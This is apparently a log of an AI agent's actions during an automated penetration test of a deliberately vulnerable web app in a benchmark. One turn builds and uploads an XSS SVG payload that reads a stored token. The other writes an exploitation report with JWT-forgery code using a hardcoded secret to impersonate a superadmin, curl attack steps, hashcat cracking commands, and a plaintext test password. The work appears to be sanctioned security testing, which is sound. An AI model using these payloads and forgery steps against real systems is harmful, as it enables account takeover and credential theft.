[2026-04-08 08:50:08] [xss-exploit] [LLM] Turn 112: {"type":"tool_use","id":"toolu_011Rr99nxWF5y691Yoc8NBte","name":"Bash","input":{"command":"# The SVG page causes a timeout likely because it has no doctype/title that the snapshot AI can parse\n# Let's try creating a modified SVG that sets the title and doesn't cause a timeout\nCONV_ID=\"94ed70f4-293a-4b5c-9a35-11449a1b5155\"\nATTACKER_JWT=\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjExZDA4NThkLTRkNTUtNDdhZi05ZWQ3LWFjYjZlNmRlOWNjNCIsImVtYWlsIjoieHNzX2F0dGFja2VyQHRlc3QuY29tIiwicm9sZSI6ImNsaWVudCIsIndhbGxldEJhbGFuY2UiOiIwIiwiaWF0IjoxNzc1NjM3NjE0LCJleHAiOjE3NzYyNDI0MTR9.4KfAhI3WvLaiqvHUAO14k1rxo5qUYpSApo9ekLIZBrM\"\n\n# Create an SVG that triggers XSS and also displays readable text\ncat > /tmp/evil_xss2.svg << 'EOF'\n<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"300\" height=\"200\" onload=\"document.title=localStorage.getItem('hf_token')||'no-token'\">\n  <rect width=\"300\" height=\"200\" fill=\"red\"/>\n  <text x=\"10\" y=\"30\" fill=\"white\" font-size=\"14\">XSS via SVG</text>\n  <text x=\"10\" y=\"60\" fill=\"white\" font-size=\"10\" id=\"out\">Loading token...</text>\n  <script>\n    document.getElementById('out').textContent = localStorage.getItem('hf_token') || 'no-token';\n  </script>\n</svg>\nEOF\n\n# Upload it\nSVG2_RESPONSE=$(curl -s -X POST \"http://host.docker.internal:3000/api/messages/conversations/$CONV_ID/messages\" \\\n  -H \"Authorization: Bearer $ATTACKER_JWT\" \\\n  -F \"content=Check this SVG v2\" \\\n  -F \"attachments=@/tmp/evil_xss2.svg;type=image/svg+xml\")\necho \"SVG v2 Upload Response:\"\necho \"$SVG2_RESPONSE\"","description":"Upload a modified SVG with text content for better screenshot capture"},"caller":{"type":"direct"}}
[2026-04-08 08:50:19] [auth-exploit] [LLM] Turn 164: {"type":"tool_use","id":"toolu_018vnmkvXhod5nt1c2sxpqiA","name":"Edit","input":{"replace_all":false,"file_path":"/repos/webvulnbench/deliverables/auth_exploitation_evidence.md","old_string":"The server accepted the connection without verifying the claimed identity and broadcast `user:online` for alice_admin's UUID to all connected clients, falsely indicating the superadmin is online under the attacker's socket.\n\n---\n","new_string":"The server accepted the connection without verifying the claimed identity and broadcast `user:online` for alice_admin's UUID to all connected clients, falsely indicating the superadmin is online under the attacker's socket.\n\n---\n\n## Potential Vulnerabilities (Validation Blocked)\n\n### AUTH-VULN-01: Hardcoded JWT Secret — JWT Forgery / Vertical Privilege Escalation\n\n**Summary:**\n- **Vulnerable location:** `src/config/index.js:30` — `secret: process.env.JWT_SECRET || 'hireflow2024api'`\n- **Current Blocker:** The running Docker instance has `JWT_SECRET` set to an unknown value via environment variable, overriding the hardcoded fallback. The actual JWT secret was not discoverable through wordlist attacks.\n- **Potential Impact:** If `JWT_SECRET` is unset (e.g., container restarted without the env var, `.env` file deleted, or fresh deployment), an attacker can forge a valid JWT for ANY user — including superadmin — using the known fallback secret `hireflow2024api`.\n- **Confidence:** HIGH (code vulnerability confirmed, live instance protected by env var override)\n\n**Evidence of Vulnerability:**\n\nThe config module was loaded locally (from the same codebase as the running app), confirming the hardcoded fallback:\n```bash\nnode -e \"const config = require('./src/config/index.js'); console.log('JWT_SECRET:', config.jwt.secret);\"\n# Output: JWT_SECRET: hireflow2024api\n```\nThe `||` operator means `hireflow2024api` is active whenever `JWT_SECRET` is not explicitly set. The `.env` file no longer exists at the project root, confirming no persistent override mechanism is in place.\n\n**Attempted Exploitation:**\n\nA forged JWT was constructed using `hireflow2024api`:\n```javascript\nconst jwt = require('jsonwebtoken');\nconst token = jwt.sign(\n  { id: 'f70c491e-8c1e-4ebd-a598-48dccb15da89', email: 'alice.admin@hireflow.com',\n    role: 'superadmin', walletBalance: '0' },\n  'hireflow2024api',\n  { algorithm: 'HS256', expiresIn: '7d' }\n);\n// Sent to: GET http://host.docker.internal:3000/api/auth/me\n// Result: {\"error\":\"Invalid or expired token\"} (HTTP 401)\n```\nAn extended wordlist (30+ secrets including all known application values) was attempted. The running instance's JWT secret was not cracked. The session secret `hireflow-session-key-change-in-production` IS the active default (confirmed via HMAC verification), but `JWT_SECRET` was overridden at container startup.\n\n**How This Would Be Exploited (If Blocker Removed):**\n\nIf `JWT_SECRET` env var is unset:\n\n1. Attacker identifies target user ID from public endpoint:\n   ```bash\n   curl \"http://host.docker.internal:3000/api/users?search=admin\"\n   # alice_admin: f70c491e-8c1e-4ebd-a598-48dccb15da89 (superadmin)\n   ```\n\n2. Attacker forges JWT with hardcoded secret:\n   ```javascript\n   const token = jwt.sign(\n     { id: 'f70c491e-8c1e-4ebd-a598-48dccb15da89', role: 'superadmin', walletBalance: '0',\n       email: 'alice.admin@hireflow.com' },\n     'hireflow2024api',\n     { algorithm: 'HS256', expiresIn: '7d' }\n   );\n   ```\n\n3. Attacker uses forged token to authenticate as superadmin:\n   ```bash\n   curl -H \"Authorization: Bearer $FORGED_TOKEN\" \"http://host.docker.internal:3000/api/admin/users\"\n   ```\n\n**Expected Impact:** Full platform compromise as superadmin with access to all users' data, API keys, audit logs, and admin functions. No credentials required — only the known hardcoded secret.\n\n---\n\n### AUTH-VULN-09: Plaintext HTTP Transport — Session Cookies and Credentials Exposed\n\n**Summary:**\n- **Vulnerable location:** Infrastructure + `src/index.js:67-70` — `secure: config.env === 'production'` evaluates to `false`\n- **Current Blocker:** Exploiting this requires network-level MitM capability (same network segment as victim, or ARP spoofing) — external network access alone cannot demonstrate traffic interception.\n- **Potential Impact:** All authentication material (credentials, session cookies, JWT tokens, reset links) transmitted in cleartext over HTTP is subject to passive interception by any network observer.\n- **Confidence:** HIGH\n\n**Evidence of Vulnerability:**\n\n1. App responds on HTTP only (HTTPS connection refused):\n   ```\n   HTTP  http://host.docker.internal:3000/  → 200 OK\n   HTTPS https://host.docker.internal:3000/ → Connection refused\n   ```\n\n2. Session cookie lacks `Secure` attribute:\n   ```\n   Set-Cookie: connect.sid=s%3A...; Path=/; HttpOnly\n   # Missing: Secure flag\n   # Result: cookie transmitted over plain HTTP\n   ```\n\n3. HSTS header is set by Helmet but is INEFFECTIVE (browsers ignore HSTS on HTTP connections):\n   ```\n   Strict-Transport-Security: max-age=15552000; includeSubDomains\n   # This header on an HTTP response provides zero protection\n   ```\n\n4. Live demonstration — credentials sent in cleartext:\n   ```\n   POST http://host.docker.internal:3000/api/auth/login HTTP/1.1\n   Content-Type: application/json\n   {\"email\":\"alice.admin@hireflow.com\",\"password\":\"SecondReset123!\"}\n   # Entire request including credentials is plaintext over the wire\n   ```\n\n**How This Would Be Exploited (With Network Access):**\n\nIf positioned as MitM on the same network segment:\n\n1. Passive capture of any POST `/api/auth/login` request reveals plaintext credentials.\n2. Session cookies in subsequent requests (lacking `Secure` flag) are visible in HTTP traffic.\n3. JWT Bearer tokens in `Authorization` headers are captured in cleartext.\n\n---\n\n### AUTH-VULN-10: Low bcrypt Work Factor (4 Rounds) — Accelerated Offline Password Cracking\n\n**Summary:**\n- **Vulnerable location:** `src/auth/auth.service.js:8` — `const SALT_ROUNDS = 4`\n- **Current Blocker:** Offline password cracking requires a database dump (PostgreSQL on port 5432, or SQL injection exfiltration). Direct database access is not available from the external network in this engagement.\n- **Potential Impact:** Passwords crack ~5x faster than with the recommended 10 rounds. At rounds=4, an attacker can test ~91 password guesses/second vs ~18/second at rounds=10 on typical hardware; GPU-accelerated attacks would be proportionally faster.\n- **Confidence:** HIGH\n\n**Evidence of Vulnerability:**\n\nCode confirmation (`src/auth/auth.service.js:8`):\n```javascript\nconst SALT_ROUNDS = 4;\n// Applied at: createUser() line 11, updatePassword() line 129\n```\n\nLive timing benchmark (same bcryptjs library and version as the running application):\n```\nRounds=4:  11ms per hash  → ~91 attempts/second\nRounds=10: 57ms per hash  → ~18 attempts/second\nRounds=12: 212ms per hash → ~5 attempts/second\n\nSpeedup vs rounds=10: ~5x\nSpeedup vs rounds=12: ~19x\n```\nNIST SP 800-63B requires a minimum of 10 rounds.\n\n**How This Would Be Exploited (With Database Access):**\n\n1. Obtain password hashes via SQL injection at `GET /api/users?search=` (identified injection sink) or direct PostgreSQL access.\n2. Run hashcat/john against the `$2a$04$...` hashes with rounds=4:\n   ```bash\n   hashcat -m 3200 hashes.txt wordlist.txt\n   # ~5x faster than if rounds=10 were used\n   ```\n\n---\n\n## False Positives (Documented, Not Reported)\n\nSee `workspace/auth_false_positives.md` for details on AUTH-VULN-02 (Session Cookie Forgery via Redis).\n\n**AUTH-VULN-02 Summary:** The session secret `hireflow-session-key-change-in-production` was confirmed as the active signing secret by HMAC verification. Cookie forgery of signatures is achievable (demonstrated indirectly via AUTH-VULN-05 session fixation). However, the complete \"forge an arbitrary session for another user from scratch\" attack requires injecting session data into Redis (port 6379), which is not accessible from the external network. The session secret knowledge was fully weaponized through AUTH-VULN-05 instead.\n"},"caller":{"type":"direct"}}
